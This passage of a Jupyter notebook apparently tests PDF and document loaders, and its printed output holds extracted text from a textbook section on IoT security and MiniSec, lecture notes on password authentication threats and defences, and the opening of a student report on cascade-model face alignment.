the distributed IoT device collection, including identity \\r\\nand attributes of each device. Building on this visibility is the ability to exert \\r\\ncontrol, including configuration, patch updates, and threat countermeasures.\\r\\nAn important concept related to this framework is that of trust relationship. In \\r\\nthis context, trust relationship refers to the ability of the two partners to an exchange to \\r\\nhave confidence in the identity and access rights of the other. The authentication com\\ufffeponent of the trust framework provides a basic level of trust, which is expanded with the \\r\\nauthorization component. [FRAH15] gives the example that a car may establish a trust \\r\\nrelationship with another car from the same vendor. That trust relationship, however, \\r\\nmay only allow cars to exchange their safety capabilities. When a trusted relationship \\r\\nis established between the same car and its dealer’s network, the car may be allowed to \\r\\nshare additional information such as its odometer reading and last maintenance record.\\r\\nAn Open-source IoT Security Module\\r\\nThis section provides an overview of MiniSec, an open-source security module that is \\r\\npart of the TinyOS operating system. TinyOS is designed for small embedded systems \\r\\nwith tight requirements on memory, processing time, real-time response, and power \\r\\nconsumption. TinyOS takes the process of streamlining quite far, resulting in a very \\r\\nminimal OS for embedded systems, with a typical configuration requiring 48 KB \\r\\nof code and 10 KB of RAM [LEVI12]. The main application of TinyOS is wireless \\r\\nsensor networks, and it has become the de facto OS for such networks. With sensor \\r\\nnetworks the primary security concerns relate to wireless communications. MiniSec \\r\\nis designed to be a link-level module that offers a high level of security, while simul\\ufffetaneously keeping energy consumption low and using very little memory [LUK07]. \\r\\nMiniSec provides confidentiality, authentication, and replay protection.\\r\\nMiniSec has two operating modes, one tailored for single-source communica\\ufffetion, and another tailored for multi-source broadcast communication. The latter does \\r\\nnot require per-sender state for replay protection and thus scales to large networks.\\r\\nMiniSec is designed to meet the following requirements:\\r\\n• Data authentication: Enables a legitimate node to verify whether a message \\r\\noriginated from another legitimate node (i.e., a node with which it shares a \\r\\nsecret key) and was unchanged during transmission.\\r\\n• Confidentiality: A basic requirement for any secure communications system.\\r\\n• Replay protection: Prevents an attacker from successfully recording a packet \\r\\nand replaying it at a later time.\\r\\n• Freshness: Because sensor nodes often stream time-varying measurements, \\r\\nproviding guarantee of message freshness is an important property. There are \\r\\nM13_STAL0611_04_GE_C13.indd 476 10/11/17 3:08 PM\\n\\n\\n13.5 / IoT SECURITY 477\\r\\ntwo types of freshness: Strong and weak. MiniSec provides a mechanism to \\r\\nguarantee weak freshness, where a receiver can determine a partial ordering \\r\\nover received messages without a local reference time point.\\r\\n• Low energy overhead: This is achieved by minimizing communication overhead \\r\\nand by using only symmetric encryption.\\r\\n• Resilient to lost messages: The relatively high occurrence of dropped packets \\r\\nin wireless sensor networks requires a design that can tolerate high message \\r\\nloss rates.\\r\\nCRYPTOGRAPHIC ALGORITHMS Two cryptographic algorithms used by MiniSec are \\r\\nworth noting. The first of these is the encryption algorithm Skipjack. Skipjack was \\r\\ndeveloped in the 1990s by the U.S. National Security Agency (NSA). It is one of \\r\\nthe simplest and fastest block cipher algorithms, which is critical to embedded sys\\ufffetems. A study of eight possible candidate algorithms for wireless security networks \\r\\n[LAW06] concluded that Skipjack was the best algorithm in terms of code memory, \\r\\ndata memory, encryption/decryption efficiency, and key setup efficiency.\\r\\nSkipjack makes use of an 80-bit key. It was intended by NSA to provide a secure \\r\\nsystem once it became clear that DES, with only a 56-bit key, was vulnerable. Contem\\ufffeporary algorithms, such as AES, employ a key length of at least 128 bits, and 80 bits \\r\\nis generally considered inadequate. However, for the limited application of wireless \\r\\nsensor networks and other IoT devices, which provide large volumes of short data \\r\\nblocks over a slow data link, Skipjack suffices. With its efficient computation and low \\r\\nmemory footprint, Skipjack is an attractive choice for IoT devices.\\r\\nThe block cipher mode of operation chosen for MiniSec is the Offset Codebook \\r\\n(OCB) mode. As mentioned in Chapter 2, a mode of operation must be specified \\r\\nwhen a plaintext source consists of multiple blocks of data to be encrypted with the \\r\\nsame encryption key. OCB mode is provably secure assuming the underlying block \\r\\ncipher is secure. OCB mode is a one-pass mode of operation making it highly effi\\ufffecient. Only one block cipher call is necessary for each plaintext block, (with an addi\\ufffetional two calls needed to complete the whole encryption process). OCB is especially \\r\\nwell suited for the stringent energy constraints of sensor nodes.\\r\\nA feature that contributes significantly to the efficiency of OCB is that with \\r\\none pass through the sequence of plaintext blocks, it produces a ciphertext of equal \\r\\nlength and a tag for authentication. To decrypt a ciphertext, the receiver performs \\r\\nthe reverse process to recover the plaintext. Then, the receiver ensures that the tag is \\r\\nas expected. If the receiver computes a different tag than the one accompanying the \\r\\nciphertext, the ciphertext is considered to be invalid. Thus, both message authentica\\ufffetion and message confidentiality are achieved with a single, simple algorithm. OCB \\r\\nwill be described in Chapter 21.\\r\\nMiniSec employs per-device keys; that is, each key is unique to a particular pair \\r\\nof devices to prevent replay attacks.\\r\\nOPERATING MODES MiniSec has two operating modes: Unicast (MiniSec-U) and \\r\\nbroadcast (MiniSec-B). Both schemes use OCB with a counter, known as a nonce, \\r\\nthat is input along with the plaintext into the encryption algorithm. The least sig\\ufffenificant bits of the counter are also sent as plaintext to enable synchronization. For \\r\\nboth modes, data are transmitted in packets. Each packet includes the encrypted data \\r\\nblock, the OCB authentication tag, and the MiniSec counter.\\r\\nM13_STAL0611_04_GE_C13.indd 477 10/11/17 3:08 PM\\n\\n\\n478 CHAPTER 13 / CLOUD AND IoT SECURITY\\r\\nMiniSec-U employs synchronized counters, which require the receiver to keep \\r\\na local counter for each sender. The strictly monotonically increasing counter guar\\ufffeantees semantic confidentiality.1\\r\\n Even if the sender A repeatedly sends the same \\r\\nmessage, each ciphertext is different because a different counter value is used. In \\r\\naddition, once a receiver observes a counter value, it rejects packets with an equal \\r\\nor smaller counter value. Therefore, an attacker cannot replay any packet that the \\r\\nreceiver has previously received. If a number of packets are dropped, the sender and \\r\\nreceiver engage in a resynchronization protocol.\\r\\nMiniSec-U cannot be directly used to secure broadcast communication. First, \\r\\nit would be too expensive to run the counter resynchronization protocol among \\r\\nmany receivers. In addition, if a node was to simultaneously receive packets from a \\r\\nlarge group of sending nodes, it would need to maintain a counter for each sender, \\r\\nresulting in high memory overhead. Instead, it uses two mechanisms, a timing-based \\r\\napproach and a bloom-filter approach, that defend against replay attacks. First, the \\r\\ntime is divided into t-length epochs E1,E2,.... Using the current epoch or the previ\\ufffeous epoch as nonce for OCB encryption, the replay of messages from older epochs \\r\\nis avoided. The timing approach is augmented with a bloom-filter approach in order \\r\\nto prevent replay attacks inside the current epoch. MiniSec-B uses as nonce element \\r\\nin OCB encryption and bloom-filter key the string nodeID.Ei.Cab, where nodeID\\r\\nis the sender node identifier, Ei is the current epoch, and Cab is a shared counter. \\r\\nEvery time that a node receives a message, it checks if it belongs to its bloom filter. \\r\\nIf the message is not replayed, it is stored in the bloom filter. Else, the node drops it.\\r\\nFor further details on the two operating modes, see [TOBA07].\\r\\n13.6 KEY TERMS AND REVIEW QUESTIONS\\r\\n1\\r\\nSemantic confidentiality means that if the same plaintext is encrypted twice, the two resulting ciphertexts \\r\\nare different.\\r\\nKey Terms\\r\\nactuator\\r\\nbackbone network\\r\\ncloud auditor\\r\\ncloud broker\\r\\ncloud carrier\\r\\ncloud computing\\r\\ncloud service consumer (CSC)\\r\\ncloud service provider (CSP)\\r\\ncommunity cloud\\r\\ncore\\r\\ndata loss prevention (DLP)\\r\\nedge\\r\\nfog\\r\\nhybrid cloud\\r\\nidentity and access \\r\\nmanagement (IAM)\\r\\ninfrastructure as a service \\r\\n(IaaS)\\r\\nInternet of things (IoT)\\r\\nintrusion management\\r\\nmicrocontroller\\r\\nMiniSec\\r\\nmulti-instance model\\r\\nmulti-tenant model\\r\\nOpenStack\\r\\npatching vulnerability\\r\\nplatform as a service (PaaS)\\r\\nprivate cloud\\r\\npublic cloud\\r\\nradio-frequency identification \\r\\n(RFID)\\r\\nsecurity as a service (SecaaS)\\r\\nsecurity assessments\\r\\nsecurity information and event \\r\\nmanagement (SIEM)\\r\\nsensor\\r\\nservice arbitrage\\r\\nservice aggregation\\r\\nservice intermediation\\r\\nsoftware as a service (SaaS)\\r\\ntransceiver\\r\\nM13_STAL0611_04_GE_C13.indd 478 10/11/17 3:08 PM\\n\\n\\n13.6 / KEY TERMS AND REVIEW QUESTIONS 479\\r\\nReview Questions\\r\\n13.1 List five essential characteristics of cloud computing.\\r\\n13.2 List and briefly define three cloud service models.\\r\\n13.3 Briefly explain the most prominent deployment models for cloud computing.\\r\\n13.4 Describe some of the main cloud-specific security threats.\\r\\n13.5 What is OpenStack?\\r\\n13.6 Define the Internet of things.\\r\\n13.7 List any five security recommendations included in the ITU-T recommendation.\\r\\n13.8 Define the patching vulnerability.\\r\\n13.9 What is the IoT security framework?\\r\\n13.10 What are some of the key features of the Skipjack encryption algorithm?\\r\\nM13_STAL0611_04_GE_C13.indd 479 10/11/17 3:08 PM\\n' metadata={'source': 'docs/computer-security-principles-practice-4th-global_part1-2.pdf', 'page': 0}\n",
      "<class 'langchain_core.documents.base.Document'>\n"
     ]
    }
   ],
   "source": [
    "print(pdfs[0])\n",
    "print(type(pdfs[0]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# from langchain.docstore.document import Document\n",
    "\n",
    "# pdfs = Document(page_content=\"\\n\\n\".join([page.page_content for page in pdfs]), metadata=pdfs[0].metadata)\n",
    "# print(pdfs)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use UnstructuredPDFLoader"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing docs/computer-security-principles-practice-4th-global_part1-2.pdf...\n"
     ]
    }
   ],
   "source": [
    "pdfs = []\n",
    "for filepath in filepaths:\n",
    "    print(f\"Processing {filepath}...\")\n",
    "    loader = UnstructuredPDFLoader(filepath)\n",
    "    pages = loader.load()\n",
    "    print(f\"Loaded {len(pages)} pages.\")\n",
    "    pdfs += pages\n",
    "print(f\"Total {len(pdfs)} pages.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "page_content='Chapter 2\\n\\nIdentiﬁcation and authentication\\n\\n2.1\\n\\nIntroduction\\n\\nIn this chapter, we will consider why identiﬁcation is an extremely important aspect of computer security and look at some methods that can be implemented in order to identify computer users. We will also consider the ways in which an identiﬁcation system can be abused and methods that can be used to minimise the threats to security.\\n\\nSupplementary reading\\n\\nChapter 2 of Computer security by Gollmann is a good introduction to identiﬁcation and authentication. Do an Internet search on password crackers. Analysis of a password cracking program will give you an insight on how\\n\\nfast these programs run and the size of the dictionaries that they use.\\n\\nAfter studying this chapter and the recommended reading, you should be able to:\\n\\nshow familiarity with the concepts of identiﬁcation and authentication describe how a user-name/password system works understand that a user may prove their identity using something they are, something they know or something they have identify different kinds of threats such as password guessing attacks, password spooﬁng attacks and attacks on the password ﬁle; and give measures that can be used to prevent or detect these attacks understand the importance of educating system users so that they do not choose a weak password that may undermine the security of the system describe how to protect a password ﬁle by using a one-way function to encrypt the passwords know that one-time passwords can be implemented to reduce the risk of a password being discovered by an attacker show familiarity with alternative methods for identiﬁcation and authentication and know that it is important to assess the security need when choosing which method to apply in a given situation.\\n\\n2.2 User-names and Passwords\\n\\nWhen a computer system has to verify a user’s identity, there are two basic questions that have to be asked and answered appropriately. The ﬁrst is:\\n\\n11\\n\\nComputer security\\n\\nWho are you?\\n\\nThe computer system has to establish somehow who is trying to gain access to its ﬁles. This is usually done by use of a user-name which, although probably unique to the user, is not a secret. The user-name is often simply produced using all or part of the user’s actual name. For example, the user-name of John Smith might be JSmith or johnsmith.\\n\\nWhen John Smith correctly enters his user-name, the computer can establish, by looking in a database of authorised user-names, that John Smith is an authorised user of the system. However, a second question now has to be asked:\\n\\nHow do I know that you are who you say you are?\\n\\nThe computer must now establish that the person logging into the system as John Smith actually is John Smith. Since the user-name is not a secret, anyone could try to log into the system using the identity of John. The person logging in must somehow prove that they are the genuine John Smith. This is usually done by using a password. The password is a secret and is only known to the genuine user John Smith. By entering this secret password, in conjunction with his user-name, John proves to the computer that he is an authorised user and is allowed access to the system.\\n\\nThus there are typically two stages in the process of identiﬁcation.\\n\\n1. A user-name is used to establish identity.\\n\\n2. A password is used to establish authentication of identity.\\n\\nYour own name is an example of something you are. If you apply for a bank loan or a travel visa you will have to prove you are who you say you are by showing, for example, your passport. Your passport is an example of something you have. Another example of something you have might be a bank card. In order to use the bank card to withdraw money at a cash machine, you do not have to prove who you are, but you do have to prove that you are authorised to use the card. This is done by using something you know. In this case the PIN number associated with the bank card. It is possible (although not recommended) for a person to lend their bank card to someone else. However, the second person will only be able to withdraw money using the bank card if they know the correct PIN number. A password is another example of something you know. Thus, a person can identify themselves by using something they are, something they have, or something they know.\\n\\n2.3 Threats\\n\\nA basic identiﬁcation system consists of a database of passwords indexed by user-names. This is called the password ﬁle. When a user logs into the system, the computer checks that the user-name and password input match an entry in the password ﬁle. If a match is found, the process is complete and the user is allowed access to the system. If not, access is denied although the user may be given another chance to enter their user-name and password.\\n\\nThere are various ways in which a user-name/password identiﬁcation system can be abused. The simplest attacks include the hacker looking over the user’s shoulder when they are typing in their password, or ﬁnding a written note that the user has\\n\\n12\\n\\nmade of their password. In the following sections we will consider some further possible attacks that might be used and defences that can be employed to either prevent, or detect, an attack.\\n\\n2.3.1 Password guessing\\n\\nSuppose that a hacker wants to access a system which is protected by a user-name/password identiﬁcation system. We will assume that the hacker knows the user-name of an authorised user since this information is not generally secret. Therefore if the hacker can guess the user’s password he will gain access to the system. There are several ways in which the hacker can ﬁnd out the user’s password. These include:\\n\\nGuessing using personal knowledge of the user\\n\\nMany people use passwords which relate to them personally. For example, they may use the name of their spouse or child or pet. They may use their football team or street name or birth date. If the hacker can ﬁnd out personal information about the user, then they may be able to guess a personal password without too much difﬁculty.\\n\\nThis attack will fail if the user is careful not to use a password which is personally related to them in any way.\\n\\nDictionary searching\\n\\nAnother favourite method of generating easy to remember passwords is for the user to choose a word, usually in their own language. If the hacker cannot directly guess the user’s password then he may set up a dictionary attack. This means that he will run a computer programme which tries every word in a dictionary as the password of the user until he ﬁnds a match.\\n\\nThis attack will fail if the user does not use a word which appears in a dictionary as their password.\\n\\nIntelligent searching\\n\\nSome user-name/password systems insist that the user’s password contains a mix of letters and numbers. The most common thing for a user (who has not been educated in password security) to do is add a number onto the end of a word. For example, using a password such as banana1. An intelligent dictionary search might try all words with numbers added. Thus if the hacker knows that a particular password system insists that passwords are a minimum of six characters long and must contain at least one number, then the hacker may try all ﬁve letter words with each of the digits 0,..,9 attached. Thus apple0, apple1, apple2,....,apple9, apply0, apply1,... and so on would form part of this search.\\n\\nIf this attack does not succeed, the next step might be to capitalise the ﬁrst letter of each word in the dictionary. Other intelligent dictionary modiﬁcations include capitalising each letter of the word in turn, including a number at the front of the\\n\\nThreats\\n\\n13\\n\\nComputer security\\n\\nword, including a number in any position in the word or replacing letters which are similar to numbers with that number. For example, replacing the letter l with the number 1 or the letter o with the number 0.\\n\\nExhaustive searching\\n\\nIf the user has been clever enough to use a random, meaningless string of characters as their password, then the hacker may have to resort to trying an exhaustive search attack. An exhaustive search is similar to a dictionary search, but in the exhaustive case, the computer programme used by the hacker will try every possible combination of permissible characters as the password in order to ﬁnd a match. Thus if searching for a six character password, the hacker might try aaaaaa, aaaaab, aaaaac, ....., aaaaaz, aaaaa0,...., aaaaa9, aaaaa*, etc. and move systematically through all possible permutations.\\n\\nThis attack will always succeed eventually. Since every possible password is tried in turn sooner or later a match will be found. However, there are ways of making an exhaustive search so time consuming for the hacker that it is not successful during the life of the password (i.e. before the exhaustive search is successful the password has been changed). Some password systems insist that the users change their passwords every three months, for example.\\n\\nLearning activity\\n\\nA hacker is trying to ﬁnd a password in order to get access to a computer system. He does not have any personal information about the system users, but he knows that all passwords are at least eight characters long and can contain any upper or lower case letter, digit, or other keyboard character. What kind of attack do you think the hacker should attempt?\\n\\n2.3.2 Number of passwords\\n\\nAn intelligent attacker will carry out dictionary and intelligent or modiﬁed dictionary attacks before attempting an exhaustive search. This is because, although an exhaustive search is bound to succeed eventually and a dictionary search may fail, if it succeeds, the dictionary search is much faster.\\n\\nSuppose that passwords are six characters long.\\n\\nIf the password is made up only of lower case letters, then there are 26 choices for each character in the password. Hence there are 266 = 308, 915, 776 passwords of six lower case letters.\\n\\n38 possible\\n\\n≈\\n\\nIf we include lower and capital letters, there are 526\\n\\n≈\\n\\n210 possible passwords.\\n\\nAdding in digits as well, gives a choice out of 62 for each character in the password and there are now 626\\n\\n5.710 possible passwords.\\n\\n≈\\n\\nFinally if we allow any keyboard character including ¡ ¿ * & etc. there are approximately 100 different choices for each character in the password and hence there are 1006 = 1012 possible passwords.\\n\\n14\\n\\nIn general, if a password is n characters long and is made up from an alphabet of A different characters, then there are An possible different passwords.\\n\\nNow suppose that a hacker has written a computer program which can try 10,000 passwords per second.\\n\\nThe hacker has a dictionary ﬁle which contains 1,000,000 common six letter words. First he runs a dictionary attack trying every word in his dictionary. This will only take him 1, 000, 000/10, 000 = 100 seconds to complete.\\n\\nMaking modiﬁcations to the dictionary, for example capitalising each word is easy and it only takes the hacker a few more minutes to run modiﬁed dictionary searches.\\n\\nIf a dictionary search is not successful then the hacker may try every combination of lowercase letters. This will take 266/10, 000 seconds, which is just over 8.5 hours to try every combination of lower case letters.\\n\\nIn comparison, if the hacker attempts an exhaustive search using all 100 possible characters in every combination, it will take 1006/10, 000 = 108 seconds to complete and this is over three years!\\n\\nNote that the average time for a hacker to ﬁnd a particular kind of password is only half the time taken to do a complete search (i.e. if a user has chosen a dictionary word as their password, then the hacker will, on average, only have to search through half of the dictionary in order to ﬁnd the password). Likewise, on average, a hacker using an exhaustive search will only have to search through half of the possible passwords before ﬁnding a match.\\n\\nLearning activity\\n\\n1. How many different passwords of lower case letters are there if the password is of length four? How many if the password is of length eight?\\n\\n2. How many different alphanumeric (any letter or digit) passwords are there if the password is of length four? How many if the password is of length eight?\\n\\n3. On average, how long will it take a hacker to ﬁnd a password of length eight which is made up entirely of lowercase letters:\\n\\n(a) if the hacker tries only combinations of lowercase letters?\\n\\n(b) if the hacker tries all alphanumeric combinations?\\n\\nAssume that the hacker can try 10,000 passwords per second.\\n\\n2.3.3 Password spooﬁng\\n\\nA spooﬁng attack is when the user is fooled into giving the hacker their password. Spooﬁng attacks may be very simple or very sophisticated.\\n\\nThreats\\n\\n15\\n\\nComputer security\\n\\nAsking the user\\n\\nThis may sound unlikely, but it is a fact that a lot of people will tell you a password if you can convince them that you need to know it.1 For example, the hacker may phone the user, and tell them that he is from their ofﬁce computer staff and that there is a problem with the ﬁles. All backed-up information is going to be lost so he needs the user password in order to recover the data. Sometimes an approach as simple as this will work and the user is fooled into giving the hacker their password.\\n\\nThis attack will fail if the user has been educated in computer security and refuses to reveal their password.\\n\\nFake log-in screens\\n\\nA more sophisticated spooﬁng attack is when the hacker sets up a fake log-in screen which exactly resembles the genuine log-in screen for the system. The user is presented with this log-in screen and unsuspectingly enters their user-name and password. The hacker captures this information and then typically gives the user an error message saying that they have incorrectly typed in their password. The genuine log-in screen is then displayed. The user cannot be sure that they did not make a typing mistake, so they type in their user-name and password again and gain access to the system. The user may have no idea that they have been the victim of a spooﬁng attack.\\n\\nThis attack will fail if the user notices that there is something wrong with the log-in screen and so does not enter their user-name and password. Some log-in interfaces contain patterns or pictures which are impossible to replicate accurately. The attack can be detected (although not prevented) if the user is informed, at every log-in, of the time of the last failed log-in attempt. After a spoof attack, the user thinks that they had a failed log-in. If when the user successfully logs in, the system does not inform them of this failed log-in then the user is alerted to the fact that they may have been the victim of a spoof attack.\\n\\nPhishing\\n\\nPhishing is similar to the above. Communications such as emails or instant messages purporting to be from reliable sites such as eBay, PayPal or online banks direct users to a fake website which looks very like the genuine one. Here the user is asked to input their username, password and perhaps their bank details.\\n\\nPhishing is a growing problem and attempts to deal with it include legislation, user training, public awareness and technical security measures.\\n\\n1In 2004 an experiment was done by a small group of researchers at a London railway station. They asked the commuters at the station to reveal one of the passwords that they used at work in exchange for a bar of chocolate. Over 70 per cent of the commuters gave a password away! There was no check that the passwords were genuine so wily individuals may have given false passwords. However, it is very likely that many genuine passwords were revealed. You can ﬁnd more information about this experiment by doing an Internet search on password for chocolate.\\n\\n16\\n\\n2.3.4 User and system defences\\n\\nThere are various things that users can do in order to minimise the risk of a hacker getting hold of their password. When a user-name/password system is implemented, it is important that the users are informed of the following measures:\\n\\nThe user should always set up a password and not leave the password option as blank.\\n\\nThe user should change the default password.\\n\\nThe user should change their password frequently.\\n\\nThe user should not use the same password for all systems.\\n\\nWhen changing a password, the user should not just add a digit onto the end of the old password.\\n\\nThe user should not choose a password that relates to them personally such as their date of birth or the name of their child.\\n\\nThe user should not choose a dictionary word as their password.\\n\\nThe user should not choose a password that is too short.\\n\\nThe user should choose a password that contains a mix of letters and numbers.\\n\\nThe user should not write their password down or reveal it to anyone.\\n\\nSome of these measures can be enforced by the system. Things that the system can do in order to minimise the risk of attack include:\\n\\ninsist that the user creates a password\\n\\nprovide the user with a default password\\n\\nenforce the user to change the default password at the ﬁrst log-in\\n\\nenforce the user to change their password at frequent intervals (say every three or six months depending on the security need)\\n\\ncheck password choices against a dictionary and reject weak passwords\\n\\ninsist that passwords contain an alphanumeric mix of characters\\n\\ninsist that passwords are at least a minimum length (say 6+ characters depending on the security need)\\n\\nlimit log-in attempts (a maximum of three attempts is usual) after which time the system administrator will have to reset the password for the user\\n\\ninform users of each unsuccessful log-in attempt.\\n\\nLearning activity\\n\\nSuppose a user has an account on a user-name/password system and that they want to change their password. Write a protocol for a secure procedure that should be followed to enable this.\\n\\nThreats\\n\\n17' metadata={'source': 'docs/computer-security-note--section2.1-2.3.pdf'}\n"
     ]
    }
   ],
   "source": [
    "# print(pdfs[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Load Microsoft doc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 1 pages.\n",
      "page_content=\"Face Alignment on 44 landmarks by Cascade Model\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nCandidate No.: 263156\\n\\nMay 2023\\n\\nUniversity of Sussex\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nAbstract\\n\\nFace alignment, also known as face key point detection, is the basis for many face-related tasks such as face detection, expression analysis, etc. It detects a predefined set of face key points (e.g. eyes, eyebrows, nose, mouth etc.) for a given face. It is the task of detecting a pre-defined set of face key points (e.g. eyes, eyebrows, nose, mouth, etc.) for a given face. This report uses a cascade model to perform 44 face keypoint detection. It also covers some attempts to improve the performance of simple CNN models and some analysis of failure cases. \\n\\n\\n\\n\\n\\n\\n\\n\\nIntroduction\\n\\nFace key points can reflect some critical features of the face and are essential for face-related machine-learning tasks. The training dataset for this assignment is divided into two parts, a full 44-keypoint face keypoint dataset and a missing dataset with only five key points to improve model performance. I have tried two main models, a cascade model and a ResNet18 model trained with the full dataset (He, 2016) for comparison with the cascade model. The cascade model has two stages (Feng et al., 2018). The first stage is a ResNet18 model that predicts five key points. The face image is corrected based on the five points output by the first stage model and then fed into the second stage ResNet50 model. In addition, I tried various data augmentation methods and Wing loss to train the model, but the results were not very good. The exact results and analysis will be given later. The detailed implementation and code for this assignment can be found at https://github.com/Xiao001010/FaceAlignment. I will make this repository public after the 20th of May. But I will also submit it with my homework. \\n\\nModels\\n\\nResNet\\n\\nBefore the advent of Vision Transformer, the ResNet model and its variants were commonly used in computer vision tasks. The main difference between ResNet and traditional convolutional neural networks such as LeNet and AlexNet is that ResNet uses residual connections between the different blocks, as shown in Figure 1 and Equation 1 (He et al., 2016). If the shape of x is different from the shape of the features output by F(x) here, the features x are first downsampled by the downsample module into the same shape as the output features before being summed.  This not only preserves the original features but also solves the problem of gradient explosion and gradient disappearance in deeper networks. \\n\\n\\t(1)\\n\\n\\n\\nFigure 1 | Residual Connection (He et al., 2016). \\n\\nThe ResNet structure is shown in Figure 2. ResNet has five stages of convolutional neural networks and a pooling layer with a fully connected layer at the end. Each stage consists of several BasicBlocks (ResNet18, 34) or BottleNeck blocks (ResNet50, 101, 152), each of which reduces the size of the features by half (He et al., 2016). The first stage of ResNet18 and 34 raises the number of channels from 3 to 64, the second stage will maintain 64 channels, and the following three stages will all output double the number of channels from the previous stage. And details of the channel transformations for ResNet50,101 and 152 can be found in Figure 2 and comments in the code. The number of outputs needed for the task is output at the final fully connected layer. In Figure 2, the probabilities of 1000 categories are output according to the requirements of the ImageNet task, and the coordinates of 44 key points i.e. 88 values will be output in this task. The ResNet input image size is the same as the ImageNet three-channel 224x224 image, so I also resized the data from 256x256 to 224x224 in the input (I also processed the landmarks accordingly). \\n\\n\\n\\nFigure 2 | ResNet Structure (He et al. 2016)\\n\\nSpace is limited here, and I cannot describe the ResNet model in more detail. But I believe that most CV workers are already familiar with ResNet, so there is no need to go into too much detail on it. \\n\\nCascade Model\\n\\nAs shown in Figure 3, the cascade model is divided into two stages. The first stage consists of ResNet18, which will output five key points. The coordinates of the first and second key points, i.e. the left and right eye corners, are taken from the five key points output by the first stage model to calculate the angle of the corrected face. Then the image is corrected by warpAffine in OpenCV (if training, the coordinates of the 44 key points are also corrected at the same angle). The corrected face image is then fed into the second stage ResNet50 model, and the 44 keypoint coordinates are output, as shown in Figure 3. It is important to note here that since the input was resized to 224x224, the image and the predicted key points are not only restored to their original angles based on the angles used to correct the face after the first stage, but the image and the output key points are also resized to 256x256. According to Feng's paper (2018), his first stage model uses a shallow convolutional neural network to extract coarse-grained features, while the second stage uses a deeper network to extract finer-grained features, so I used ResNet18 to predict five key points in the first stage and a deeper ResNet50 to extract a finer 44 face keypoints in the second stage. \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nFigure 3 | Cascade Model. \\n\\nData\\n\\nThere are two datasets used for training, a missing dataset with only five points labelled, containing 1386 three-channel face images and five key points corresponding to each image, and a complete dataset with 44 points labelled, containing a total of 1425 data. The task is to predict the 44 key points of the face. I split the complete dataset into a training set (1140 images) and a validation set (285 images) on a scale of 0.8. The validation set was used to evaluate the model's performance for each training epoch to determine whether the model works and is over-fitted. The Normalized Mean Error (NME) of the model on the validation set was also calculated, and the model was saved when the NME dropped. This assignment focused on training a cascade model and a ResNet18 model for comparison with the cascade model. The ResNet18 model for the first stage of the cascade model was trained with the training set obtained by splitting together with a missing dataset with only five points labelled (only five key points in the full dataset were taken for training). Again, only five points in the validation set were taken to evaluate the model. The second stage of the cascade model, the ResNet50 model, was only trained with the training set obtained by splitting. The ResNet18 model, used for comparison with the cascade model, was trained using only the split training set. \\n\\nPreprocess\\n\\nSince the general image input size for ResNet is 224x224, I first resized the image from 256x256 to 224x224 while doing the corresponding processing for the key points of the face. In fact, since the last stage of ResNet uses AdaptiveAvgPool2d, the input image size does not need to be fixed at 224x224, a 256x256 image can also be trained, but I did not know this until after I had finished training. I then normalised the image to speed up the convergence of the model by subtracting the mean and dividing by the standard deviation, then dividing by 255 to compress the pixel values to between 0 and 1. Here I used the default mean of 128 and std127.5 from torchlm.LandmarksNormalize (DefTruth and Lalu, 2022), it would have made more sense to use the mean and standard deviation calculated on the current dataset or the values calculated on ImageNet. Finally, the data type was converted to the Tenser data type.\\n\\nAugmentation\\n\\nIn this assignment, I tried many data augmentation methods such as light, shadows, masks, translation, shearing, multiscale, slight angle rotation and blur, as shown in Figure 5. Most were implemented through the torchlm library (DefTruth and Lalu, 2022).\\n\\nAs I felt that the Brightness and Mask data augmentations in torchlm were ineffective, I customised the Light, Shadow and Mask methods. However, I found that the custom data augmentation methods were very time-consuming when training. torchlm's Brightness is a change to the global brightness, I customised the Light and Shadow methods to transform the local brightness, as circled in red in Figure 5. This is more consistent with the reality of light on a face and shadows on a face. The mask in torchlm is too irregular, so I customised a Mask method to generate a square mask. I didn't use a horizontal flip here because the order of the coordinates of the key points after the flip would be the opposite of the defined order (as circled in yellow in Figure 5), which is also similar to the slight angle rotation. Finally, I have combined Light, Shadow, Mask, Translate, Shear, Scale, Rotate, Blur, Resize, Normalization, and ToTensor with the function Compose to get the final data augmentation. \\n\\nAlthough data augmentation doesn't work as well as training without it, it is a common way to improve model performance nowadays. This result may be because most faces in the dataset we were provided with were already at the same scale, and finding the appropriate data augmentation method was complex. \\n\\nTrain\\n\\nI did a lot of experimentation in training the models to find the most suitable configuration and parameters for each model, but this also took much of my time. For this assignment, I used NME to evaluate the performance of the model, as defined in Equation 2, where  and  are the coordinates of the predicted and ground-truth landmarks, respectively, M is the number of landmarks and  is the normalisation factor, here using the interocular distance, which is the distance between the outer corners of the eyes (Huang et al., 2021). I tried the Mean Square Error (MSE) loss function and Wing Loss (whose definition is shown in Figure 4), allowing the model to focus more on details (Feng et al., 2018). However, the final experimental results indicated that the NME of the Wing Loss trained model was not as good as that of the MSE trained one. I think this may be because I just used the default parameters of Wing Loss and did not delve into the choice of these two parameters. In addition, I used the Adam optimiser and an exponential scheduler for the learning rate. For most experiments, the exponential learning rate scheduler used a gamma of 0.8 (the learning rate is multiplied by the gamma for each epoch). The lack of careful adjustment of the gamma value of the exponential learning rate scheduler may also be another reason for the poor results of part of the models.\\n\\n\\t(2)\\n\\n\\n\\nFigure 4 | Wing Loss (Feng et al., 2018). \\n\\nThe best configuration and hyperparameters for each model are shown in Table 1. Further details of the experiments can be found in the results.xlsx file in the results folder, where each experiment's configuration parameters and results are recorded. You can also see the process of each experiment in the logs folder. In addition, I have saved the loss, NME, etc., of each experiment in the runs folder via tensorboard. I uploaded the best model parameters to Google Drive, which can be found as a link in README.md. If you want to run the training, run the main.py file after downloading the data and checkpoints files, you can also change the 